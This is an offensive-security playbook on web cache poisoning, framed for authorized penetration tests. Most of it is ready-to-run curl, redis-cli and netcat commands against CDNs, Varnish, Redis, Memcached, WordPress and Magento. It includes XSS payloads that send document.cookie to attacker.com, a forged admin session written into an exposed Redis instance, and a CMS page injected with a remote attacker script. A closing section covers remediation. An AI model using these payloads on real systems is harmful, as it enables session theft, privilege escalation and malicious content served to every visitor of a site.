# Web Cache Poisoning — Offensive Specialist Skill

**Scope:** Authorized penetration tests and bug bounty programs only.  
**Version:** 2026-current | Verified against Portswigger Research, HackerOne reports, Varnish/Redis/Cloudflare docs.

---

## 1. Background and Threat Model

Web cache poisoning stores malicious content in a cache so it is served to other users. The attacker exploits a discrepancy between what the cache server uses as a cache key and what the origin server processes. Cache poisoning is distinct from cache deception (tricking the cache into storing private content).

**Impact range:**
- Stored XSS affecting all users who receive the poisoned response
- Open redirect for phishing at scale
- DoS by caching error pages or invalid responses
- RCE if server-side rendering uses cached values (rare but documented)

**Prerequisites:**
- The application uses a cache (CDN, reverse proxy, object cache)
- At least one unkeyed input affects the response
- The poisoned entry can be served before TTL expiry

---

## 2. Methodology Overview

```
Step 1: Identify cacheable endpoints
Step 2: Map the cache key (keyed vs unkeyed inputs)
Step 3: Find a reflected unkeyed input that affects response
Step 4: Craft a payload that survives caching
Step 5: Confirm the poisoned response is served to other clients
Step 6: Escalate (XSS payload, redirect, header injection)
```

---

## 3. Identifying Unkeyed Headers

### 3.1 Using Param Miner (Burp Suite)
1. Install Param Miner extension from BApp Store
2. Right-click any request → "Guess headers"
3. Enable "Add FCB" (fat chunked body) to detect reflection without cache busters
4. Review "Output" tab for unkeyed reflected headers

### 3.2 Manual Detection with curl
```bash
# Baseline request — note X-Cache header
curl -s -I "https://target.com/page" -H "Cache-Buster: $(date +%s)"

# Test X-Forwarded-Host injection
curl -s -I "https://target.com/page" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "Cache-Buster: $(date +%s)1"

# Test X-Forwarded-Scheme
curl -s -I "https://target.com/page" \
  -H "X-Forwarded-Scheme: nothttps" \
  -H "Cache-Buster: $(date +%s)2"

# Test X-Host, X-Original-URL, X-Rewrite-URL
for hdr in "X-Host" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Server"; do
  echo "=== $hdr ==="
  curl -sI "https://target.com/page" -H "$hdr: evil.attacker.com" | grep -i "location\|evil\|x-cache"
done
```

### 3.3 Common Unkeyed Inputs (2026 list)
| Header | Effect on Response | Cache Key Inclusion |
|--------|-------------------|---------------------|
| X-Forwarded-Host | Used in absolute URLs, redirects | Usually unkeyed |
| X-Forwarded-Scheme | HTTP→HTTPS redirect generation | Usually unkeyed |
| X-Original-URL | Path overriding on some frameworks | Usually unkeyed |
| X-Forwarded-For | IP-based features, geolocation | Sometimes partially keyed |
| Vary: Accept-Language | Content negotiation | Depends on CDN config |
| Accept-Encoding | Compression selection | Usually keyed but variants exist |
| Origin | CORS header reflection | Often unkeyed |

---

## 4. CDN-Specific Cache Key Manipulation

### 4.1 Cloudflare Cache Poisoning
Cloudflare's cache key by default: scheme + host + path + query string.
Headers are NOT part of the cache key unless explicitly configured.

**Attack vector — X-Forwarded-Host reflection:**
```bash
# Check if X-Forwarded-Host is reflected in response
curl -sI "https://target.com/" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  | grep -i "location\|content-security\|access-control"

# If app generates absolute URLs using X-Forwarded-Host:
# Poison so all users get redirected to attacker
curl -s "https://target.com/" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "Cache-Buster: poisontest1"
# Then fetch without the header — if reflected URL persists, cache is poisoned
curl -s "https://target.com/?cache-buster=poisontest1" | grep "evil.attacker.com"
```

**Cache parameter cloaking (Cloudflare):**
Cloudflare normalizes parameters; some origins do not.
```bash
# Cloudflare sees: /page?param=x
# Origin sees:    /page?param=x&utm_source=evil
curl -s "https://target.com/page?param=x?utm_source=<script>alert(1)</script>" \
  | grep -i script
# ? inside query string tricks the keying logic in some configs
```

**Fat GET attack:**
```bash
# GET with body — Cloudflare ignores body, origin processes it
curl -s -X GET "https://target.com/api/data" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 22" \
  -d "param=<script>xss</script>"
```

### 4.2 Fastly Cache Key Manipulation
Fastly uses VCL (Varnish Configuration Language) with `req.hash` to build cache keys.

**Surrogate-Key header abuse:**
```bash
# If the app reflects Surrogate-Key in responses for custom purging:
curl -s "https://target.com/page" \
  -H "Surrogate-Key: injected-key" \
  | grep -i "surrogate"
```

**Fastly-Debug unkeyed header:**
```bash
curl -s "https://target.com/" \
  -H "Fastly-Debug: 1" \
  | grep -i "x-cache\|x-served-by\|fastly"
```

### 4.3 Akamai Cache Poisoning
Akamai uses pragma headers and edge configurations.

```bash
# Akamai-specific cache busting and poison
curl -sI "https://target.com/page" \
  -H "Pragma: akamai-x-cache-on" \
  -H "Pragma: akamai-x-check-cacheable"

# Edge-Control header injection
curl -s "https://target.com/page" \
  -H "Edge-Control: max-age=86400" \
  | grep -i "edge-control\|cache"
```

---

## 5. Redis / Memcached Unauthenticated Access → Cache Poisoning

### 5.1 Discovering Exposed Redis
```bash
# Mass scan for open Redis (requires authorization)
nmap -sV -p 6379 --script redis-info <target-range>

# Direct connection test
redis-cli -h <target-ip> -p 6379 ping
redis-cli -h <target-ip> -p 6379 info server

# Check for authentication
redis-cli -h <target-ip> -p 6379 config get requirepass
```

### 5.2 Enumerating Cache Keys
```bash
# List all keys (WARNING: can be slow on large Redis instances)
redis-cli -h <target-ip> keys '*'

# Safer: use SCAN
redis-cli -h <target-ip> scan 0 match '*session*' count 100
redis-cli -h <target-ip> scan 0 match '*cache*' count 100

# Inspect a key's type and value
redis-cli -h <target-ip> type <key>
redis-cli -h <target-ip> get <key>
redis-cli -h <target-ip> ttl <key>
```

### 5.3 Cache Poisoning via Redis SET
```bash
# If session data is stored as serialized PHP/JSON:
# 1. Read an existing session to understand format
redis-cli -h <target-ip> get "laravel_session:abc123"

# 2. Forge a poisoned value (example: PHP serialized with admin role)
# Original: a:2:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";}
# Forged:   a:2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}
redis-cli -h <target-ip> set "laravel_session:abc123" \
  'a:2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}'

# 3. For web cache entries (HTML content):
redis-cli -h <target-ip> set "page_cache:/home" \
  '<html><script>document.location="https://attacker.com/steal?c="+document.cookie</script></html>'
redis-cli -h <target-ip> expire "page_cache:/home" 3600
```

### 5.4 Memcached Unauthenticated Poisoning
Memcached has NO authentication by default.
```bash
# Connect via netcat
echo -e "version\r" | nc <target-ip> 11211

# Dump keys (Memcached <1.4.31 or slabs method)
echo -e "stats cachedump 1 0\r" | nc <target-ip> 11211

# Read a key
echo -e "get page_cache_home\r" | nc <target-ip> 11211

# SET poisoned value
printf "set page_cache_home 0 3600 %d\r\n%s\r\n" \
  ${#PAYLOAD} "$PAYLOAD" | nc <target-ip> 11211
# where PAYLOAD is your XSS/redirect content
```

---

## 6. Varnish VCL Misconfiguration Exploitation

### 6.1 Varnish Cache Internals
Varnish uses VCL (Varnish Configuration Language) to define caching rules.
The cache key (`hash_data`) determines what is cached.

Common VCL misconfigurations:
1. Not hashing the Host header → same cached content for all vhosts
2. Hashing X-Forwarded-For → each IP gets unique cache (intended), but if combined with XSS reflection, attacker can poison their own cache shard
3. Passing through dangerous headers to origin without stripping

### 6.2 Detecting Varnish
```bash
curl -sI "https://target.com/" | grep -i "via\|x-varnish\|age"
# Via: 1.1 varnish (Varnish/7.x)
# X-Varnish: 123456789 987654321  (two IDs = cache HIT)
# Age: 42  (seconds in cache)
```

### 6.3 VCL Misconfiguration — Host Header Injection
If VCL does NOT include `hash_data(req.http.host)`:
```bash
# Poison the shared cache entry
curl -s "https://target.com/page" \
  -H "Host: evil.attacker.com" \
  -H "Cache-Buster: unique123"
# Now fetch normally — if the cache returns the poisoned response:
curl -s "https://target.com/page?cache-buster=unique123"
```

### 6.4 Vary Header Analysis
```bash
# Check what dimensions the cache varies on
curl -sI "https://target.com/page" | grep -i "vary"
# Vary: Accept-Encoding        <- normal
# Vary: Accept-Language        <- can be exploited if Accept-Language reflected unsanitized
# Vary: Cookie                 <- sessions separated (correct)

# If Vary: Accept-Language and language is reflected:
curl -s "https://target.com/page" \
  -H "Accept-Language: <script>alert(1)</script>" \
  -H "Cache-Buster: langtest1"
```

---

## 7. WordPress Transient / Object Cache Poisoning

### 7.1 WordPress Object Cache Architecture
WordPress uses a two-tier cache:
- **Internal object cache**: in-memory per-request (WP_Object_Cache)
- **Persistent object cache**: Redis/Memcached via drop-in plugin (object-cache.php)

Transients are stored in `wp_options` table or in the persistent cache with key format:
`_transient_<name>` / `_site_transient_<name>`

### 7.2 wp-cron Cache Injection (Requires auth or SQLi/file write)
```bash
# If attacker has write access to wp_options (via SQLi or low-priv account):
# Poison a transient that is rendered unsanitized
INSERT INTO wp_options (option_name, option_value, autoload)
VALUES ('_transient_my_feature_content',
        '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>',
        'no')
ON DUPLICATE KEY UPDATE option_value = VALUES(option_value);
```

### 7.3 Redis Object Cache Poisoning (via exposed Redis)
```bash
# WordPress with Redis Object Cache plugin uses keys like:
# wp:default:post_type_link:123
# wp:default:options:alloptions

# Read existing key
redis-cli -h <redis-ip> get "wp:default:options:alloptions"

# Poison navigation menu (serialized PHP array)
# Requires understanding the serialized PHP format
redis-cli -h <redis-ip> set "wp:default:nav_menu_items:42" \
  'a:1:{i:0;a:1:{s:5:"title";s:50:"<script>alert(document.domain)</script>";}'

# Force cache flush via wp-cron SSRF (if wp-cron is enabled)
curl "https://target.com/wp-cron.php?doing_wp_cron=1"
```

---

## 8. Magento Layout XML Cache Poisoning

### 8.1 Magento Cache Architecture
Magento 2 uses a layered cache:
- Full Page Cache (Varnish or built-in)
- Block cache (layout XML rendered blocks)
- Config cache (merged configuration)

### 8.2 Admin Panel Layout XML Injection
If attacker has Magento admin access (or exploited admin creation via SQLi):
```bash
# Via admin panel: Content → Design → Schedule
# Inject layout XML that loads remote JS:
# <referenceContainer name="head.additional">
#   <block class="Magento\Framework\View\Element\Template" name="evil" template="Magento_Theme::evil.phtml"/>
# </referenceContainer>

# Via REST API (if admin token obtained):
curl -X PUT "https://target.com/rest/V1/cmsPage/1" \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"page":{"content":"<script src=\"https://attacker.com/evil.js\"></script>"}}'
```

### 8.3 Poisoning Varnish Full Page Cache on Magento
```bash
# Magento uses X-Magento-Tags for cache tagging
# If custom headers affect cache key:
curl -s "https://magento-target.com/category/shoes.html" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "X-Forwarded-Scheme: https"

# Check FPC hit/miss
curl -sI "https://magento-target.com/category/shoes.html" \
  | grep -i "x-magento\|age\|via"
```

---

## 9. Cache Deception vs Cache Poisoning (Differentiation)

| | Cache Poisoning | Cache Deception |
|---|---|---|
| Goal | Make cache store malicious content | Make cache store victim's private content |
| Who is harmed | Other users receive poisoned response | Attacker retrieves cached private data |
| Attack vector | Unkeyed inputs in request | Path confusion tricks (e.g., /api/secret/x.css) |
| Example | XSS payload in cached page | Account details cached at attacker-guessable URL |

---

## 10. Detection and Analysis Tools

### 10.1 Param Miner Workflow
1. Enable Burp Suite with Param Miner installed
2. Browse target → identify cacheable GET endpoints
3. Right-click → Extensions → Param Miner → "Guess headers"
4. Check "Add FCB" and set cache buster header
5. Review "Output" → look for "Cache param found"
6. Manually verify findings with curl

### 10.2 Cache Buster Strategy
```bash
# Always add a unique parameter to avoid poisoning production cache during testing
BUSTER=$(date +%s%N | md5sum | head -c 8)
curl -s "https://target.com/page?cb=${BUSTER}" \
  -H "X-Forwarded-Host: evil.attacker.com"
```

### 10.3 Cache-Control Analysis
```bash
curl -sI "https://target.com/page" | grep -iE "cache-control|pragma|age|vary|x-cache"
# Cache-Control: public, max-age=3600  <- cacheable, 1hr TTL
# Cache-Control: private               <- not cached by shared caches
# Cache-Control: no-store              <- never cached
# Age: 0                               <- freshly cached or not cached
# X-Cache: HIT                         <- served from cache
# X-Cache: MISS                        <- cache miss, fetched from origin
```

---

## 11. Remediation

### Per-Backend Recommendations

**CDN/Reverse Proxy (Nginx, Varnish, Cloudflare):**
- Define explicit cache keys that include all headers affecting response
- Strip or ignore headers like X-Forwarded-Host at edge before they reach origin
- Use `Vary` header correctly — only include dimensions that genuinely affect response
- Implement cache key normalization

**Redis (object cache):**
- Enable `requirepass` in redis.conf
- Bind to 127.0.0.1 only: `bind 127.0.0.1`
- Use Redis ACLs (v6+) for least-privilege access
- Encrypt data in transit with TLS (`tls-port 6380`)

**Memcached:**
- SASL authentication: `memcached -S` flag
- Never expose Memcached to the internet (port 11211)
- Use firewall rules to restrict to application servers only

**WordPress:**
- Sanitize all values before storing to transients
- Use `esc_html()` / `esc_url()` when rendering cached data
- Restrict Redis access to localhost

**Application-level:**
- Validate and whitelist all headers before using in responses
- Avoid including user-controlled input in cache tags or surrogate keys
- Audit custom VCL/CDN configuration annually

---

## 12. Finding Schema

```
Title: Web Cache Poisoning via [vector]
CVSS: 8.0-9.0 (Stored XSS scope changed, AV:N/AC:L)
Target: https://target.com/page
Evidence: curl commands + poisoned response screenshot
Impact: Persistent XSS / Redirect affecting all visitors
Remediation: [backend-specific fix above]
References: https://portswigger.net/research/practical-web-cache-poisoning
```

---

*All targets in this document are placeholder references. Apply only to in-scope authorized systems.*
